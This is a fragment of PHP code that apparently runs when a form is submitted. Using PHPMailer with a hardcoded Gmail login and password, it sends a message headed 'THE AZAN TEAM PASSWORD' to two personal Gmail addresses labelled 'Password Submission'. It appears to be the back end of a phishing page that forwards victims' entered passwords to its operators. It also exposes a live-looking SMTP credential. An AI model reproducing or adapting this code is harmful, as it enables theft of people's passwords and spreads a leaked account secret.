...
if(isset($_POST['ButtonNext']))
{
  ...
  try {
      ...
      $mail->Username   = 'cookiesbymrz@gmail.com';                     //SMTP username
      $mail->Password   = 'vuvhoaxlbmnsyita';                               //SMTP password
      $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
      $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

      //Recipients
      $mail->setFrom('cookiesbymrz@gmail.com', 'THE AZAN TEAM PASSWORD');
      $mail->addAddress('raeesnizamani153@gmail.com', 'Password Submission');
     $mail->addAddress('sahilnizamani444@gmail.com', 'Password Submission');
      //Content
